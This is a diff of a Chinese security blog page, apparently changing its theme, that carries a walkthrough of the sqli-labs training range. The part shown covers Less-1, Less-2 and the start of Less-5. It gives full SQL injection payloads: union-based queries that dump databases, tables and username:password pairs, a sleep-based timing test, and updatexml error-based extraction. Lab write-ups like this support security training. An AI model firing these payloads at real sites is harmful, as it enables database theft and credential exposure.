@@ -1,158 +1,300 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqli靶场(1~22关) | echozt</title><meta name="author" content="echozt"><meta name="copyright" content="echozt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ccccff">
+  <meta name="author" content="echozt">
+  <meta name="keywords" content="网络安全，计算机，渗透">
+  
+    <meta name="description" content="又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli靶场(1~22关)">
 <meta property="og:url" content="https://echozt.github.io/posts/bb32.html">
 <meta property="og:site_name" content="echozt">
 <meta property="og:description" content="又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://echozt.github.io/img/featureimages/5.jpg">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_8.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_9.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/1_10.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_8.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_9.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/5_10.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/7.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/8.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9_5.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/9_6.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/11.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/11_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/11_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/13.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/13_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/13_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/17.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/17_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/18.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/18_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/18_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/18_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/19.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/19_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/19_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/19_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/20.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/20_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/20_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/20_4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/21.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/21_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/21_3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/22.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/22_2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/bb32/22_3.png">
 <meta property="article:published_time" content="2022-04-08T15:45:48.000Z">
 <meta property="article:modified_time" content="2024-11-04T08:37:55.757Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Web漏洞">
 <meta property="article:tag" content="sql注入">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://echozt.github.io/img/featureimages/5.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://echozt.github.io/posts/bb32.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
-
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!false && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        if (name && globalFn[key][name]) return
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://echozt.github.io/posts/bb32/1.png">
   
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
-
-      const theme = saveToLocal.get('theme')
-    
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
-        
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
-    
-      
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
   
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: undefined,
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'sqli靶场(1~22关)',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2024-11-04 16:37:55'
-}</script><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="echozt" type="application/atom+xml">
+  <title>sqli靶场(1~22关) - echozt</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/daziyanse.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"echozt.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="echozt" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">82</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/featureimages/5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">echozt</span></a><a class="nav-page-title" href="/"><span class="site-name">sqli靶场(1~22关)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqli靶场(1~22关)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-08T15:45:48.000Z" title="发表于 2022-04-08 23:45:48">2022-04-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-04T08:37:55.757Z" title="更新于 2024-11-04 16:37:55">2024-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%B8%93%E9%A1%B9%E9%9D%B6%E5%9C%BA/">专项靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。</p>
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>echozt&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sqli靶场(1~22关)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      echozt
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-08 23:45" pubdate>
+        2022年4月8日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      11k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli靶场(1~22关)</h1>
+            
+            <div class="markdown-body">
+              <p>又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。</p>
 <span id="more"></span>
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一部分就是union联合注入和盲注。</p>
@@ -187,61 +329,61 @@
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="（1）用order-by判断有几个字段"><a href="#（1）用order-by判断有几个字段" class="headerlink" title="（1）用order by判断有几个字段"></a>（1）用order by判断有几个字段</h4><p>order by就是如果到n出错，则字段数为n-1。</p>
 <p>当构造?id=1’ order by 4–+时会报错，则说明字段数为3。</p>
-<img src="/posts/bb32/1.png" class>
+<img src="/posts/bb32/1.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="（2）判断回显点"><a href="#（2）判断回显点" class="headerlink" title="（2）判断回显点"></a>（2）判断回显点</h4><p>构造?id=1’ union select 1,2,3–+</p>
 <p>当id的数据在数据库中不存在时，此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来。</p>
 <p>此处前台页面返回了我们构造的union的数据。可以看到回显点是2和3。  </p>
-<img src="/posts/bb32/1_2.png" class>
+<img src="/posts/bb32/1_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西"><a href="#（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西" class="headerlink" title="（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西"></a>（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</h4><h3 id="1-1获取数据库"><a href="#1-1获取数据库" class="headerlink" title="1.1获取数据库"></a>1.1获取数据库</h3><h4 id="①获取单个数据库名"><a href="#①获取单个数据库名" class="headerlink" title="①获取单个数据库名"></a>①获取单个数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到数据库名为security</p>
-<img src="/posts/bb32/1_3.png" class>
+<img src="/posts/bb32/1_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得所有数据库名"><a href="#②获得所有数据库名" class="headerlink" title="②获得所有数据库名"></a>②获得所有数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可获取所有的数据库：</p>
-<img src="/posts/bb32/1_4.png" class>
+<img src="/posts/bb32/1_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><h4 id="①得到单个表格"><a href="#①得到单个表格" class="headerlink" title="①得到单个表格"></a>①得到单个表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到表为emails：</p>
-<img src="/posts/bb32/1_5.png" class>
+<img src="/posts/bb32/1_5.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②得到所有表格"><a href="#②得到所有表格" class="headerlink" title="②得到所有表格"></a>②得到所有表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可得到所有的表：</p>
-<img src="/posts/bb32/1_6.png" class>
+<img src="/posts/bb32/1_6.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="1-3获取字段名"><a href="#1-3获取字段名" class="headerlink" title="1.3获取字段名"></a>1.3获取字段名</h3><h4 id="①获得单个字段名"><a href="#①获得单个字段名" class="headerlink" title="①获得单个字段名"></a>①获得单个字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select column_name from information_schema.columns where table_name='</span>users' limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到字段名user_id：</p>
-<img src="/posts/bb32/1_7.png" class>
+<img src="/posts/bb32/1_7.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得所有字段名"><a href="#②获得所有字段名" class="headerlink" title="②获得所有字段名"></a>②获得所有字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可查到所有字段名:</p>
-<img src="/posts/bb32/1_8.png" class>
+<img src="/posts/bb32/1_8.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="1-4获取表格里面的内容"><a href="#1-4获取表格里面的内容" class="headerlink" title="1.4获取表格里面的内容"></a>1.4获取表格里面的内容</h3><h4 id="①获得单个用户名和密码"><a href="#①获得单个用户名和密码" class="headerlink" title="①获得单个用户名和密码"></a>①获得单个用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> where id<span class="token operator">=</span>2--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可以得到用户名为Angelina,密码为：I-kill-you</p>
-<img src="/posts/bb32/1_9.png" class>
+<img src="/posts/bb32/1_9.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得所有的用户名和密码"><a href="#②获得所有的用户名和密码" class="headerlink" title="②获得所有的用户名和密码"></a>②获得所有的用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -252,7 +394,7 @@ id<span class="token operator">=</span>-1<span class="token string">' union sele
 id=-1'</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 0,1<span class="token punctuation">)</span> --+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可得到所有的用户名和密码。</p>
-<img src="/posts/bb32/1_10.png" class>
+<img src="/posts/bb32/1_10.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>输入1’</p>
 <pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span> LIMIT 0,1'
@@ -325,47 +467,47 @@ id<span class="token operator">=</span>1"<span class="token punctuation">)</span
 id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>发现网络延时五秒响应，可以用延时注入：</p>
-<img src="/posts/bb32/5.png" class>
+<img src="/posts/bb32/5.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="（2）可以使用报错注入："><a href="#（2）可以使用报错注入：" class="headerlink" title="（2）可以使用报错注入："></a>（2）可以使用报错注入：</h3><p>输入单引号，发现出现报错信息，因此可以使用报错注入。</p>
 <h4 id="①得到库"><a href="#①得到库" class="headerlink" title="①得到库"></a>①得到库</h4><pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>会报错显示当前库不存在这个函数，所以数据库名可以看到为security：</p>
-<img src="/posts/bb32/5_2.png" class>
+<img src="/posts/bb32/5_2.png" srcset="/img/loading.gif" lazyload class>
 
 <p>当然也可以直接构造payload:</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>同样得到数据库名为security：</p>
-<img src="/posts/bb32/5_3.png" class>
+<img src="/posts/bb32/5_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获取用户名"><a href="#②获取用户名" class="headerlink" title="②获取用户名"></a>②获取用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+
